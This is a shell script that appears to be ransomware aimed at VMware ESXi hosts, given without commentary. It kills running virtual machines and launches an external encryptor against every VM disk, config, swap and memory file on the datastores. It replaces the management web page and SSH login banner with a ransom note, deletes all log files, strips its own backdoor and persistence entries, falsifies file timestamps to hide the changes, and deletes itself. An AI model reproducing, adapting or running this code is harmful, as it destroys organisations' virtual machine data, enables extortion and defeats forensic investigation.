#!/bin/sh
CLEAN_DIR="/tmp/"

# SET LIMITS

ulimit -p $(ulimit -Hp)
ulimit -n $(ulimit -Hn)

## CHANGE CONFIG

for config_file in $(esxcli vm process list | grep "Config File" | awk '{print $3}'); do
  echo "FIND CONFIG: $config_file"
  sed -i -e 's/.vmdk/1.vmdk/g' -e 's/.vswp/1.vswp/g' "$config_file"
done

## STOP VMX
echo "KILL VMX"
kill -9 $(ps | grep vmx | awk '{print $2}')

## ENCRYPT

chmod +x $CLEAN_DIR/encrypt

for volume in $(IFS='\n' esxcli storage filesystem list | grep "/vmfs/volumes/" | awk -F'  ' '{print $2}'); do
  echo "START VOLUME: $volume"
  IFS=$'\n'
  for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem"); do
      if [[ -f "$file_e" ]]; then
        size_kb=$(du -k $file_e | awk '{print $1}')
        if [[ $size_kb -eq 0 ]]; then
          size_kb=1
        fi
        size_step=0
        if [[ $(($size_kb/1024)) -gt 128 ]]; then
          size_step=$((($size_kb/1024/100)-1))
        fi
        echo "START ENCRYPT: $file_e SIZE: $size_kb STEP SIZE: $size_step" "\"$file_e\" $size_step 1 $((size_kb*1024))"
        echo $size_step 1 $((size_kb*1024)) > "$file_e.args"
        nohup $CLEAN_DIR/encrypt $CLEAN_DIR/public.pem "$file_e" $size_step 1 $((size_kb*1024)) >/dev/null 2>&1&
      fi
  done
  IFS=$" "
done

## INDEX.HTML
CLEAN_DIR="/tmp/"
IFS=$'\n'
for file_ui in $(find /usr/lib/vmware -type f -name index.html); do
  path_to_ui=$(dirname $file_ui)
  echo "FIND UI: $path_to_ui"
  mv "$path_to_ui/index.html" "$path_to_ui/index1.html"
  cp "$CLEAN_DIR/index.html" "$path_to_ui/index.html"
done
IFS=$' '

## SSH HI

mv /etc/motd /etc/motd1 && cp $CLEAN_DIR/motd /etc/motd

## DELETE
echo "START DELETE"

/bin/find / -name *.log -exec /bin/rm -rf {} \;

A=$(/bin/ps | /bin/grep encrypt | /bin/grep -v grep | /bin/wc -l)
while [[ $A -ne 0 ]];
do
  /bin/echo "Waiting for task' completion... ($A)"
  /bin/sleep 0.1
  A=$(/bin/ps | /bin/grep encrypt  | /bin/grep -v grep | /bin/wc -l)
done

if [ -f "/sbin/hostd-probe.bak" ];
then
  /bin/rm -f /sbin/hostd-probe
  /bin/mv /sbin/hostd-probe.bak /sbin/hostd-probe
  /bin/touch -r /usr/lib/vmware/busybox/bin/busybox /sbin/hostd-probe
fi

B=$(/bin/vmware -l | /bin/grep " 7." | /bin/wc -l)
if [[ $B -ne 0 ]];
then
  /bin/chmod +w /var/spool/cron/crontabs/root
  /bin/sed '$d' /var/spool/cron/crontabs/root > /var/spool/cron/crontabs/root.1
  /bin/sed '1,8d' /var/spool/cron/crontabs/root.1 > /var/spool/cron/crontabs/root.2
  /bin/rm -f /var/spool/cron/crontabs/root /var/spool/cron/crontabs/root.1
  /bin/mv /var/spool/cron/crontabs/root.2 /var/spool/cron/crontabs/root
  /bin/touch -r /usr/lib/vmware/busybox/bin/busybox /var/spool/cron/crontabs/root
  /bin/chmod -w /var/spool/cron/crontabs/root
fi

if [[ $B -eq 0 ]];
then
  /bin/sed '1d' /bin/hostd-probe.sh > /bin/hostd-probe.sh.1 && /bin/mv /bin/hostd-probe.sh.1 /bin/hostd-probe.sh
fi

/bin/rm -f /store/packages/vmtools.py
/bin/sed '$d' /etc/vmware/rhttpproxy/endpoints.conf > /etc/vmware/rhttpproxy/endpoints.conf.1 && /bin/mv /etc/vmware/rhttpproxy/endpoints.conf.1 /etc/vmware/rhttpproxy/endpoints.conf
/bin/echo '' > /etc/rc.local.d/local.sh
/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/vmware/rhttpproxy/endpoints.conf
/bin/touch -r /etc/vmware/rhttpproxy/config.xml /bin/hostd-probe.sh
/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/rc.local.d/local.sh

/bin/rm -f $CLEAN_DIR"encrypt" $CLEAN_DIR"nohup.out" $CLEAN_DIR"index.html" $CLEAN_DIR"motd" $CLEAN_DIR"public.pem" $CLEAN_DIR"archieve.zip"

/bin/sh /bin/auto-backup.sh
/bin/rm -- "$0"

/etc/init.d/SSH start
